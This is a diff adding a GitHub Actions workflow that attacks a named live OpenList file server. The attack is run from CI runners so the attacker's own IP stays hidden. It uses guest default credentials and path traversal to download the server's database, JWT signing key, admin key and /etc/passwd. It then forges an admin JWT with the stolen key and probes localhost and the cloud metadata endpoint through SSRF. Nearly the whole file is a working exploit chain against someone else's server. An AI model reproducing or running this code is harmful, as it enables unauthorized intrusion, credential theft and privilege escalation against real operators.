@@ -1,0 +1,127 @@
+name: openlist-path-traversal
+on:
+  workflow_dispatch:
+jobs:
+  pt:
+    runs-on: ubuntu-latest
+    steps:
+      - name: CVE-2023-42442 authenticated path traversal via /api/fs/get (guest JWT, zero own-IP)
+        run: |
+          set +e
+          B="https://pan.yazinb.icu"
+          # 1) obtain guest JWT (guest/guest default cred, finding #1714)
+          TOKEN=$(curl -skS -m20 -X POST "$B/api/auth/login" -H "Content-Type: application/json" -d '{"username":"guest","password":"guest"}' | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('token',''))")
+          echo "guest_token_len=${#TOKEN}"
+          if [ -z "$TOKEN" ]; then echo "NO GUEST TOKEN (login failed)"; exit 0; fi
+          export TOKEN
+          # helper: raw_url + download
+          get_raw () { curl -skS -m30 -X POST "$B/api/fs/get" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d "{\"path\":\"$1\"}" | python3 -c "import sys,json;d=json.load(sys.stdin);print((d.get('data') or {}).get('raw_url','')) if d else ''" 2>/dev/null; }
+          dl () { curl -skS -m120 "$1" -o "$2" -w "  dl $2 -> HTTP %{http_code} bytes=%{size_download}\n"; }
+
+          # 2) baseline: a normal in-root path to confirm /api/fs/get works at all
+          echo "--- baseline in-root get (path=/) ---"
+          base_ru=$(get_raw "/")
+          echo "  baseline raw_url=[$base_ru]"
+
+          # 3) CVE-2023-42442 style authenticated path traversal: escape Local storage root
+          TRAVERSALS=(
+            "../../../../var/lib/openlist/data.db"
+            "../../../../var/lib/openlist/data/data.db"
+            "../../../../var/lib/ffauth/admin.key"
+            "../../../../var/lib/openlist/jwt.key"
+            "../../../../../var/lib/openlist/data.db"
+            "../../../../etc/passwd"
+            "../../../../var/lib/openlist/data.db.bak"
+          )
+          for p in "${TRAVERSALS[@]}"; do
+            echo "=== traversal path=[$p] ==="
+            ru=$(get_raw "$p")
+            if [ -n "$ru" ]; then
+              echo "  >>> raw_url OBTAINED: $ru"
+              safe=$(echo "$p" | tr -c 'A-Za-z0-9._-' '_')
+              case "$p" in
+                *data.db*)   dl "$ru" "/tmp/pt_data.db";   echo "  data.db sha256=$(sha256sum /tmp/pt_data.db 2>/dev/null | cut -c1-32)";;
+                *admin.key*) dl "$ru" "/tmp/pt_admin.key"; echo "  admin.key=[$(cat /tmp/pt_admin.key 2>/dev/null | head -c 200)]";;
+                *jwt.key*)   dl "$ru" "/tmp/pt_jwt.key";   echo "  jwt.key=[$(cat /tmp/pt_jwt.key 2>/dev/null | head -c 200)]";;
+                *)           dl "$ru" "/tmp/pt_${safe}.bin"; echo "  got $(wc -c </tmp/pt_${safe}.bin) bytes";;
+              esac
+            else
+              echo "  (no raw_url returned - traversal blocked / not found)"
+            fi
+          done
+          echo "--- post-traversal listing of /tmp/pt_* ---"
+          ls -la /tmp/pt_* 2>/dev/null || echo "(nothing downloaded)"
+
+          # 4) if data.db obtained, extract admin pwd_ts + master token (the only admin channel bypassing JWT invalidation)
+          if [ -f /tmp/pt_data.db ]; then
+            echo "--- analyzing OpenList user DB ---"
+            sqlite3 /tmp/pt_data.db ".tables" 2>/dev/null | tee /tmp/pt_tables.txt
+            python3 - <<'PY' 2>&1 | tee /tmp/pt_analyze.out
+          import sqlite3, time, base64, hmac, hashlib, os, json
+          con=sqlite3.connect('/tmp/pt_data.db')
+          tabs=[r[0] for r in con.execute("select name from sqlite_master where type='table'")]
+          print("TABLES", tabs)
+          ut=None; best=-1
+          for t in tabs:
+              cols=[d[1].lower() for d in con.execute('PRAGMA table_info(%s)'%t)]
+              sc=0
+              if 'pwd_ts' in cols: sc+=4
+              if any(k in x for k in ('password','pass','pwd','hash') for x in cols): sc+=2
+              if any('user' in x or x in ('name','username','uname') for x in cols): sc+=1
+              if any(x in ('role','permission','perm','is_admin','disabled') for x in cols): sc+=1
+              if sc>best: best=sc; ut=t
+          if ut and best>=3:
+              cols=[d[1] for d in con.execute('PRAGMA table_info(%s)'%ut)]
+              rows=list(con.execute('select * from %s'%ut))
+              lc=[x.lower() for x in cols]
+              uidx=next((i for i,x in enumerate(lc) if x in ('username','user','uname','name')),0)
+              for r in rows:
+                  d=dict(zip(cols,r))
+                  mask={k:(v if k.lower() not in ('password','pass','pwd','hash','password_hash','otp_secret') else '***') for k,v in d.items()}
+                  print("UROW", mask)
+                  u=str(d.get(cols[uidx]) or '').lower()
+                  if u=='admin':
+                      pts=int(d[cols[lc.index('pwd_ts')]] or 0) if 'pwd_ts' in lc else 0
+                      print("ADMIN_PWDTS", pts)
+                      open('/tmp/pt_admin_pwdts.txt','w').write(str(pts))
+                      # forge admin JWT if jwt.key present
+                      jk=open('/tmp/pt_jwt.key','rb').read().strip() if os.path.exists('/tmp/pt_jwt.key') else None
+                      if jk:
+                          key=jk
+                          def b(x): return base64.urlsafe_b64encode(x).rstrip(b'=')
+                          now=int(time.time())
+                          payload={'exp':now+3600,'iat':now,'nbf':now,'username':'admin','pwd_ts':pts}
+                          h=b(json.dumps({'alg':'HS256','typ':'JWT'}).encode())
+                          p=b(json.dumps(payload).encode())
+                          s=b(hmac.new(key,h+b'.'+p,hashlib.sha256).digest())
+                          open('/tmp/pt_admin_jwt.txt','w').write(h.decode()+'.'+p.decode()+'.'+s.decode())
+                          print("FORGED admin JWT with pwd_ts="+str(pts))
+            else:
+              print("NO_USER_TABLE best=%d"%best)
+          PY
+            AJ=$(cat /tmp/pt_admin_jwt.txt 2>/dev/null)
+            if [ -n "$AJ" ]; then
+              echo "--- verify admin session via /api/me ---"
+              curl -skS -m20 -X GET "$B/api/me" -H "Authorization: $AJ" -w "\n  HTTP %{http_code}\n" | head -c 700
+              echo "--- SSRF probes (admin) ---"
+              ssrf () {
+                name=$1; url=$2
+                echo "=== SSRF $name -> $url ==="
+                curl -skS -m30 -X POST "$B/api/fs/add_offline_download" -H "Authorization: $AJ" -H "Content-Type: application/json" -d "{\"path\":\"/$name\",\"urls\":[\"$url\"]}" -w "\n  add HTTP %{http_code}\n" | head -c 400
+                sleep 6
+                lst=$(curl -skS -m30 -X POST "$B/api/fs/list" -H "Authorization: $AJ" -H "Content-Type: application/json" -d "{\"path\":\"/$name\"}")
+                echo "  list: $(echo "$lst" | head -c 250)"
+                fn=$(echo "$lst" | python3 -c "import sys,json;d=json.load(sys.stdin);c=d.get('data',{}).get('content',[]);print(c[0]['name'] if c else '')" 2>/dev/null)
+                if [ -n "$fn" ]; then
+                  ru=$(curl -skS -m30 -X POST "$B/api/fs/get" -H "Authorization: $AJ" -H "Content-Type: application/json" -d "{\"path\":\"/$name/$fn\"}" | python3 -c "import sys,json;print(json.load(sys.stdin).get('data',{}).get('raw_url',''))" 2>/dev/null)
+                  echo "  raw_url: $ru"
+                  curl -skS -m30 "$ru" | head -c 800; echo
+                else echo "  (no file landed - SSRF blocked or async)"; fi
+              }
+              ssrf ssrf_local80 "http://127.0.0.1:80/"
+              ssrf ssrf_local5244 "http://127.0.0.1:5244/"
+              ssrf ssrf_meta "http://169.254.169.254/latest/meta-data/"
+              ssrf ssrf_self80 "http://119.28.135.153:80/"
+            fi
+          fi
+          echo "=== DONE ==="
